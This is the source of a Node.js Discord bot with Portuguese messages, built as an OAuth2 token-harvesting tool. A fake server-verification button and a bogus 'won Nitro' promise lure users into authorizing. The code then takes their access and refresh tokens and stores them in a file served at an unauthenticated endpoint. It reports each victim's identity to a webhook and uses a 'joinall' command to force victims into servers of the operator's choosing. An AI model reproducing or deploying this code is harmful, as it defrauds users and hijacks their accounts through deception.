
const Discord = require('discord.js');
const fs = require('fs');

const requiredFiles = [
    {
        path: './config.js',
        content: `module.exports = {
    token: "SEU-TOKEN-AQUI",
    id: "SEU-ID-DO-BOT",
    secret: "SEU-CLIENT-SECRET",
    webhook: "SEU-WEBHOOK",
    prefix: ";",
    owners: ["SEU-ID-AQUI"],
    port: 3000,
    authLink: "https://discord.com/api/oauth2/authorize?client_id=SEU-ID-DO-BOT&amp;redirect_uri=SEU-LINK-AQUI&amp;response_type=code&amp;scope=identify%20guilds.join",
}`
    },
    {
        path: './object.json',
        content: '[]'
    },
    {
        path: './package.json',
        content: `{
  "dependencies": {
    "axios": "^0.21.4",
    "body-parser": "^1.20.0",
    "chalk": "^4.1.2",
    "discord.js": "^13.8.1",
    "express": "^4.18.1",
    "fetch": "^1.1.0",
    "form-data": "^4.0.0",
    "FormData": "^0.10.1",
    "fs": "^0.0.1-security",
    "index.js": "^0.0.3",
    "node-fetch": "^2.6.7",
    "quick.db": "^7.1.3"
  }
}`
    }
];

requiredFiles.forEach(file =&gt; {
    if (!fs.existsSync(file.path)) {
        fs.writeFileSync(file.path, file.content);
        console.log(`[+] Arquivo criado: ${file.path}`);
    }
});

const client = new Discord.Client({
    intents: 32767
});
const config = require("./config");
const chalk = require('chalk');
const db = require('quick.db');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) =&gt; import('node-fetch').then(({ default: fetch }) =&gt; fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const { CONNREFUSED } = require('dns');


app.use(bodyParser.text())

app.get('/', function (req, res) {
    res.sendFile(__dirname + '/index.html')
})


app.get('/allAuth', async (req, res) =&gt; {
    fs.readFile('./object.json', function (err, data) {
        return res.json(JSON.parse(data))
    })
})
app.post('/', function (req, res) {
    let form = new FormData()
    form.append('client_id', config.id)
    form.append('client_secret', config.secret)
    form.append('grant_type', 'authorization_code')
    form.append('redirect_uri', '')
    form.append('scope', 'identify', 'guilds.join')
    form.append('code', req.body)
    fetch('https://discordapp.com/api/oauth2/token', {method: 'POST',body: form,})
        .then((eeee) =&gt; eeee.json())
        .then((cdcd) =&gt; {
            ac_token = cdcd.access_token
            rf_token = cdcd.refresh_token
const tgg = {headers: {authorization: `${cdcd.token_type} ${ac_token}`,}}
            axios.get('https://discordapp.com/api/users/@me', tgg)
                .then((te) =&gt; {
                    let efjr = te.data.id
                    fs.readFile('./object.json', function (res, req) {
                        if (
                            JSON.parse(req).some(
                                (ususu) =&gt; ususu.userID === efjr
                            )
                        ) {
                            console.log(
                                '[-] ' +
                                te.data.username +
                                '#' +
                                te.data.discriminator
                            )
                            return
                        }
                        console.log(
                            '[+] ' +
                            te.data.username +
                            '#' +
                            te.data.discriminator
                        )
                        avatarHASH =
                            'https://cdn.discordapp.com/avatars/' +
                            te.data.id +
                            '/' +
                            te.data.avatar +
                            '.png?size=4096'
                        fetch(config.webhook, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                avatar_url: '',
                                embeds: [
                                    {
                                        color: 3092790,
                                        title:
                                            te.data.username +
                                            '#' +
                                            te.data.discriminator +
                                            ' - ' +
                                            te.data.id,
                                        thumbnail: { url: avatarHASH },
                                        description:
                                            '```diff\n- New User\n\n- Pseudo: ' +
                                            te.data.username +
                                            '#' +
                                            te.data.discriminator +
                                            '\n\n- ID: ' +
                                            te.data.id +
                                            '```',
                                    
                                        
                                    },
                                ],
                            }),
                        })

                        var papapa = {
                            userID: te.data.id,
                            avatarURL: avatarHASH,
                            username:
                                te.data.username + '#' + te.data.discriminator,
                            access_token: ac_token,
                            refresh_token: rf_token,
                        },
                            req = []
                        req.push(papapa)
                        fs.readFile('./object.json', function (res, req) {
                            var jzjjfj = JSON.parse(req)
                            jzjjfj.push(papapa)
                            fs.writeFile(
                                './object.json',
                                JSON.stringify(jzjjfj),
                                function (eeeeeeeee) {
                                    if (eeeeeeeee) {
                                        throw eeeeeeeee
                                    }
                                }
                            )
                        })
                    })
                })
                .catch((errrr) =&gt; {
                    console.log(errrr)
                })
        })
})


client.on("ready", () =&gt; {
 
    console.log(`O BOT INICIOU, CASO ESTEJA VENDO ESSA MENSAGEM NO EDITOR. HOSPEDE SEU BOT NA REPLIT PARA FUNCIONAR, OU OUTRA HOST!`)
})




client.on("messageCreate", async (ctx) =&gt; {
    if (!ctx.guild || ctx.author.bot) return;
    const prefixRegex = new RegExp(`^(&lt;@!?${client.user.id}&gt;|${escapeRegex(config.prefix)})\\s*`);
    if (!prefixRegex.test(ctx.content)) return;
    const [, matchedPrefix] = ctx.content.match(prefixRegex);
    const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();




    if (cmd === "wl") {
        if (!config.owners.includes(ctx.author.id)) return;
        switch (args[0]) {
            case "add":
                const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() =&gt; { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user.id}`) === null) {
                    db.set(`wl_${user.id}`, true)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** Foi adicionado na whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** Já está na whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "remove":
                const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() =&gt; { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user2.id}`) !== null) {
                    db.delete(`wl_${user2.id}`)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** Foi removido da whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** Não está na whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "list":
                var content = ""
                const blrank = db.all().filter((data) =&gt; data.ID.startsWith(`wl_`)).sort((a, b) =&gt; b.data - a.data);

                for (let i in blrank) {
                    if (blrank[i].data === null) blrank[i].data = 0;
                    content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
                }

                ctx.channel.send({
                    embeds: [{
                        title: "Usuarios na Whitelist",
                        description: `${content}`,
                        color: "2F3136",
                    }]
                })
                break;
        }
    }


    if (cmd === "help") {
        if (db.get(`wl_${ctx.author.id}`) !== true &amp;&amp; !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                color: "2F3136",
                title: '👾 Lista de Comandos ',
                description:'**🤖 Bot OAuth2**\n`joinall`, `Users`, `Links`, `convite`\n\n🤖 **Prefix** `;`\n&lt;:info:997096855143989329&gt; *Message sent to users when they authorized:*\n```You have won Nitro wait 24h to get the code 🎁```',

          }]
        })
    } 
              
              
              
              
              
              

   
              


    if (cmd === "links") {
        if (db.get(`wl_${ctx.author.id}`) !== true &amp;&amp; !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                title: '👾 Oauth/Invite:',
                description: `📥 **Seu link OAuth2:** ${config.authLink}\n\`\`\`${config.authLink}\`\`\`\n🤖 **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&amp;permissions=8&amp;scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&amp;permissions=8&amp;scope=bot\`\`\` `,
                color: "2F3136"
            }]
        })
    }

    if (cmd === "convite") {
        if (db.get(`wl_${ctx.author.id}`) !== true &amp;&amp; !config.owners.includes(ctx.author.id)) return;
        const { MessageActionRow, MessageButton, MessageEmbed } = require('discord.js');
        
        const embed = new MessageEmbed()
            .setColor(0xFF1493)
            .setTitle('🔒 Verificação WHT Community')
            .setDescription(
                '**Comprove sua autenticidade clicando em Verificar-se 🔐**\n\n' +
                '### 📋 Como funciona?\n' +
                '&gt; **1.** Clique no botão **Verificar Conta** abaixo\n' +
                '&gt; **2.** Você será redirecionado para autenticar no Discord\n' +
                '&gt; **3.** A verificação é concluída automaticamente ✅\n\n' +
                '### 🛡️ Por que verificar?\n' +
                '&gt; 🤖 Protegemos o servidor contra bots\n' +
                '&gt; 🔐 Somente membros verificados acessam os canais\n' +
                '&gt; ⚡ O processo leva menos de 10 segundos\n' +
                '&gt; 👥 Mantemos nossa comunidade segura\n\n' +
                '### ⚠️ Aviso\n' +
                '&gt; Não compartilhe seus dados com ninguém\n' +
                '&gt; Em caso de problemas, contate a staff'
            )
            .setImage('https://i.imgur.com/BPB8AM1.png')
            .setThumbnail('https://coresg-normal.trae.ai/api/ide/v1/text_to_image?prompt=WHT%20Community%20logo%20wolf%20pink%20purple%20neon&amp;image_size=square')
            .setFooter({ text: 'WHT Community • Verificação • Clique no botão abaixo' });
        
        const row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                    .setCustomId('dummy')
                    .setLabel('🔐 Verificar Conta')
                    .setStyle('LINK')
                    .setURL(config.authLink)
            );

        ctx.channel.send({
            embeds: [embed],
            components: [row]
        });
    }
    
    



    if (cmd === "joinall") {
        if (db.get(`wl_${ctx.author.id}`) !== true &amp;&amp; !config.owners.includes(ctx.author.id)) return;
        let msg = await ctx.channel.send({
            content:'**Adicionando Usuarios...**'
           
        })

        fs.readFile('./object.json', async function (err, data) {
            let json = JSON.parse(data);
            let error = 0;
            let success = 0;
            let already_joined = 0;
            for (const i of json) {
                const user = await client.users.fetch(i.userID).catch(() =&gt; {});
                if (ctx.guild.members.cache.get(i.userID)) {
                    already_joined++
                }
                await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() =&gt; {
                    error++ 
                })
                success++
            }
            await msg.edit({
                content: `**Adicionando usuarios...** : \`${success}\``
            })
            await msg.edit({
                embeds: [{
                    title: '👾 0auth2 Joinall',
                    description: `📥 **Já está no servidor** : ${already_joined}\n📥 **Sucesso**: ${success}\n❌ **Error**: ${error}`,
                    color: "2F3136"
                }]
            }).catch(() =&gt; {})
        })
    }
    

    if (cmd === "users") {
      
      if (db.get(`wl_${ctx.author.id}`) !== true &amp;&amp; !config.owners.includes(ctx.author.id)) return;
      
fs.readFile('./object.json', async function (err, data) {
            return ctx.channel.send({ 
                embeds: [{
                    title: '👾 OAuth2 Usuarios:',
                    description: `📥 Aqui estão ${JSON.parse(data).length &gt; 1 ? `\`${JSON.parse(data).length}\` membros` : `\`${JSON.parse(data).length}\` usuarios registrados no bot`}\nDigite o comando \`links\` para verificar seu link OAuth2.`,
                    color: "2F3136"
                  
                }] 
            })
        })
    }
})


function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&amp;`);
}

client.login(config.token).catch(() =&gt; {
    throw new Error(`TOKEN OU INTENT INVALIDA!`)
})


app.listen(config.port, () =&gt; console.log('Conexão Ativa...'))
